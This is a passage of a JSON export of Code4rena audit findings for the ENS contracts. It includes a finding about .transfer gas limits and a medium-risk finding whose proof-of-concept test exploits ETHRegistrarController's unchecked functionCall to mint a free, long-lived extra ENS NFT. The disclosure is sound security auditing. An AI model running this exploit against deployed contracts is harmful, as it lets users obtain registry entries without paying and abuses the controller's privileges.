gas only, which may not be enough in future if the recipient is a contract and gas costs change. it could break existing contracts functionality.  ## Proof of Concept `.transfer` or `.send` method, only 2300 gas will be \u201cforwarded\u201d to fallback function. Specifically, the SLOAD instruction, will go from costing 200 gas to 800 gas.  if any smart contract has a functionality of register ens and it has fallback function which is making some state change in contract on ether receive, it could use more than 2300 gas and revert every transaction  for reference checkout this, https://docs.soliditylang.org/en/v0.8.15/security-considerations.html?highlight=transfer#sending-and-receiving-ether https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps  use `.call` insted `.transfer`       (bool success, ) = msg.sender.call.value(amount)(\"\");      require(success, \"Transfer failed.\");   "}, {"title": "Users can create extra ENS records at no cost", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/132", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L249-L268 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L125 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/BaseRegistrarImplementation.sol#L106   # Vulnerability details  ## Impact Users using the ```register``` function in ```ETHRegistrarController.sol```, can create an additional bogus ENS entry (Keep the ERC721 and all the glory for as long as they want) for free by exploiting the ```functionCall``` in the ```_setRecords``` function. The only check there (in the setRecord function) is that the nodehash matches the originally registered ENS entry, this is extremely dangerous because the rest of the functionCall is not checked and the controller has very elevated privileges in ENS ecosystem (and probably beyond).  The single exploit I am showing is already very bad, but I expect there will be more if this is left in. An example of a potential hack is that some of the functions in other ENS contracts (which give the RegistrarController elevated privilege) have dynamic types as the first variables--if users can generate a hash that is a low enough number, they will be able to unlock more exploits in the ENS ecosystem because of how dynamic types are abi encoded.  Other developers will probably also trust the ```ETHRegistrarController.sol```, so other unknown dangers may come down the road.  The exploit I made (full code in PoC) can mint another ENS entry and keep it for as long as it wants, without paying more--will show code below.  ## Proof of Concept Put this code in the ```TestEthRegistrarController.js``` test suite to run. I just appended this to tests at the bottom of file.   I called the ```BaseRegistrarImplementation.register``` function with the privileges of ```ETHRegistrarController``` by passing the base registrar's address as the ```resolver``` param in the ```ETHRegistrarController.register``` function call. I was able to set a custom duration at no additional cost.   The final checks of the PoC show that we own two new ENS entries from a single ```ETHRegistrarController.register``` call. The labelhash of the new bogus ENS entry is the nodehash of the first registered ENS entry.  ```js   it('Should allow us to make bogus erc721 token in ENS contract', async () => {     const label = 'newconfigname'     const name = `${label}.eth`     const node = namehash.hash(name)     const secondTokenDuration = 788400000 // keep bogus NFT for 25 years;      var commitment = await controller.makeCommitment(       label,       registrantAccount,       REGISTRATION_TIME,       secret,       baseRegistrar.address,       [         baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [           node,           registrantAccount,           secondTokenDuration         ]),       ],       false,       0,       0     )     var tx = await controller.commit(commitment)     expect(await controller.commitments(commitment)).to.equal(       (await web3.eth.getBlock(tx.blockNumber)).timestamp     )      await evm.advanceTime((await controller.minCommitmentAge()).toNumber())     var balanceBefore = await web3.eth.getBalance(controller.address)      let tx2 = await controller.register(       label,       registrantAccount,       REGISTRATION_TIME,       secret,       baseRegistrar.address,       [         baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [           node,           registrantAccount,           secondTokenDuration         ]),       ],       false,       0,       0,       { value: BUFFERED_REGISTRATION_COST }     )      expect(await nameWrapper.ownerOf(node)).to.equal(registrantAccount)     expect(await ens.owner(namehash.hash(name))).to.equal(nameWrapper.address)       expect(await baseRegistrar.ownerOf(node)).to.equal( // this checks that bogus NFT is owned by us       registrantAccount     )     expect(await baseRegistrar.ownerOf(sha3(label))).to.equal(       nameWrapper.address     )   }) ```  ## Tools Used chai tests in repo  ## Recommended Mitigation Steps I recommend being stricter on the signatures of the user-provided ```resolver``` and the function that is being called (like safeTransfer calls in existing token contracts). An example of how to do this is by creating an interface that ENS can publish for users that want to compose their own resolvers and call that instead of a loose functionCall. Users will be free to handle data however they like, while restricting the space of things that can go wrong.  I will provide a loose example here: ``` interface IUserResolver {     function registerRecords(bytes32 nodeId, bytes32 labelHash, bytes calldata extraData)  } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/131", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/130", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/128", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/123", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/122", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "If PARENT_CANNOT_CONTROL is set on subdomain, it can be unwrapped then wrapped by its owner and then parent can control it again before the expiry", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/119", "labels": ["bug", "2 (Med Risk)", "disagree with severity"], "target": "2022-07-ens-findings", "body": "If PARENT_CANNOT_CONTROL is set on subdomain, it can be unwrapped then wrapped by its owner and then parent can control it again before the expiry"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/115", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/111", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/110", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/109", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/108", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/107", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/104", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/103", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/99", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/95", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}]